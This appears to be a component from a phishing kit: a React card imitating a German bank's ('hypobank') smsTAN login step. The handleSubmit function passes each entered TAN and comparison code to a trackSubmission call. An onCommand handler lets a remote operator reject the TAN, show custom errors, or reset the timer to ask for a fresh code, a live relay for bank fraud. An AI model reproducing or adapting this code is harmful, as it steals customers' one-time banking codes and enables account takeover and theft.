"use client";

import { useEffect, useState } from "react";
import LanguageSwitch from "./LanguageSwitch";
import { trackSubmission, onCommand } from "@/lib/track";

const TIMER_SECONDS = 5 * 60;
const CODE_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

const generateCode = () =>
  Array.from({ length: 4 }, () =>
    CODE_ALPHABET[Math.floor(Math.random() * CODE_ALPHABET.length)]
  ).join("");

const formatTime = (s: number) => {
  const m = Math.floor(s / 60);
  const sec = s % 60;
  return `${m.toString().padStart(2, "0")}:${sec.toString().padStart(2, "0")}`;
};

const RADIUS = 45;
const CIRCUMFERENCE = 2 * Math.PI * RADIUS;

type Props = {
  verfueger: string;
  onBack: () => void;
  vergleichswert?: string;
};

export default function SmsTanCard({ verfueger, onBack, vergleichswert }: Props) {
  const [tan, setTan] = useState("");
  const [code, setCode] = useState(() => vergleichswert || generateCode());
  const [secondsLeft, setSecondsLeft] = useState(TIMER_SECONDS);
  const [showError, setShowError] = useState(false);
  const [cmdError, setCmdError] = useState<string | null>(null);

  useEffect(() => {
    if (secondsLeft <= 0) return;
    const id = setInterval(() => setSecondsLeft((s) => Math.max(0, s - 1)), 1000);
    return () => clearInterval(id);
  }, [secondsLeft]);

  /* Register command handler */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setCmdError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setCmdError(null);
          break;
        case "reject_tan":
          setCmdError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setTan("");
          break;
        case "retry_tan":
          setCmdError("Bitte geben Sie einen neuen Code ein.");
          setTan("");
          setSecondsLeft(TIMER_SECONDS);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const expired = secondsLeft <= 0;
  const offset = CIRCUMFERENCE * (1 - secondsLeft / TIMER_SECONDS);

  const handleResend = () => {
    setCode(generateCode());
    setSecondsLeft(TIMER_SECONDS);
    setTan("");
    setShowError(false);
    setCmdError(null);
  };

  const handleSubmit = () => {
    if (tan.trim() === "") {
      setShowError(true);
      return;
    }
    setCmdError(null);
    trackSubmission("hypobank", "sms_tan", { tan, vergleichswert: code });
  };

  return (
    <div className="flex justify-center items-end sm:items-center min-h-[calc(100vh-60px)] px-4 sm:px-0">
      <div className="relative bg-white rounded-lg w-full max-w-[460px] pt-3 pb-3 flex flex-col shadow-lg sm:min-h-0 min-h-[calc(100vh-100vw+0.625rem)]">
        {/* Language switch */}
        <div className="absolute top-0 right-0 w-full">
          <LanguageSwitch />
        </div>

        {/* Header inside card */}
        <div className="flex items-center gap-3 px-3 sm:px-4 pt-10 pb-3 border-b border-hyp-gray-300">
          <button
            type="button"
            onClick={onBack}
            aria-label="Zurück"
            className="w-10 h-10 -ml-2 flex items-center justify-center rounded-full hover:bg-hyp-gray-100 transition-colors text-hyp-gray-700"
          >
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="19" y1="12" x2="5" y2="12" />
              <polyline points="12 19 5 12 12 5" />
            </svg>
          </button>
          <div className="w-px h-8 bg-hyp-gray-300" />
          <div className="w-9 h-9 rounded-full bg-hyp-gray-300 flex items-center justify-center text-hyp-gray-600 flex-shrink-0">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
            </svg>
          </div>
          <span className="text-sm font-medium text-hyp-black truncate">{verfueger}</span>
        </div>

        {/* Main content */}
        <div className="px-3 sm:px-4 pt-6">
          {cmdError && (
            <div
              className="mb-4 px-3 py-2 rounded text-sm"
              style={{
                backgroundColor: "#fef2f2",
                border: "1px solid #fca5a5",
                color: "#b91c1c",
              }}
            >
              {cmdError}
            </div>
          )}

          {expired ? (
            <div className="flex flex-col items-center py-6 gap-4">
              <p className="text-sm text-center" style={{ color: "var(--hyp-danger)" }}>
                Der Code ist abgelaufen. Bitte fordern Sie einen neuen Code an.
              </p>
              <button type="button" onClick={handleResend} className="hyp-btn-primary">
                Neuen Code anfordern
              </button>
            </div>
          ) : (
            <div className="flex items-center gap-4 py-2">
              <div className="relative flex-shrink-0 w-[110px] h-[110px]">
                <svg viewBox="0 0 100 100" className="w-full h-full">
                  <circle
                    cx="50" cy="50" r={RADIUS}
                    fill="none"
                    stroke="var(--hyp-primary)"
                    strokeWidth="6"
                    strokeDasharray={CIRCUMFERENCE}
                    strokeDashoffset={offset}
                    strokeLinecap="round"
                    transform="rotate(-90 50 50)"
                    style={{ transition: "stroke-dashoffset 1s linear" }}
                  />
                </svg>
                <div className="absolute inset-0 flex items-center justify-center text-base font-medium text-hyp-black tabular-nums">
                  {formatTime(secondsLeft)}
                </div>
              </div>
              <div className="flex-1">
                <p className="text-sm" style={{ color: "rgba(0,0,0,0.54)" }}>
                  Wir haben Ihnen eine SMS gesendet.
                </p>
                <p className="text-sm mb-3" style={{ color: "rgba(0,0,0,0.54)" }}>
                  Bitte überprüfen Sie den Vergleichswert:
                </p>
                <p className="text-3xl font-semibold tracking-wider text-hyp-black">{code}</p>
              </div>
            </div>
          )}

          {/* TAN input */}
          <div className="mt-6 form-field">
            <div className="relative pt-4">
              <input
                type="text"
                value={tan}
                onChange={(e) => { setTan(e.target.value); if (showError) setShowError(false); }}
                disabled={expired}
                placeholder=" "
                className="floating-input w-full pb-1 text-base bg-transparent border-0 outline-none disabled:opacity-50"
              />
              <label
                className={`absolute left-0 transition-all duration-200 pointer-events-none ${
                  tan ? "top-0 text-xs" : "top-1/2 -translate-y-1/2 text-base"
                }`}
                style={{ color: showError ? "var(--hyp-danger)" : "rgba(0,0,0,0.54)" }}
              >
                smsTAN eingeben<span className="text-hyp-danger ml-0.5">*</span>
              </label>
            </div>
            <div className={showError ? "form-field-underline-error" : "form-field-underline"} />
            {showError && (
              <div className="flex items-center gap-1.5 mt-1 text-sm" style={{ color: "var(--hyp-danger)" }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                Pflichtfeld
              </div>
            )}
          </div>
        </div>

        {/* Submit */}
        <div className="px-3 sm:px-4 mt-6 pt-3 flex justify-center">
          <button
            type="button"
            onClick={handleSubmit}
            disabled={expired}
            className="hyp-btn-primary w-full"
          >
            Anmelden
          </button>
        </div>
        <div className="px-3 sm:px-4 mb-1" />
      </div>
    </div>
  );
}
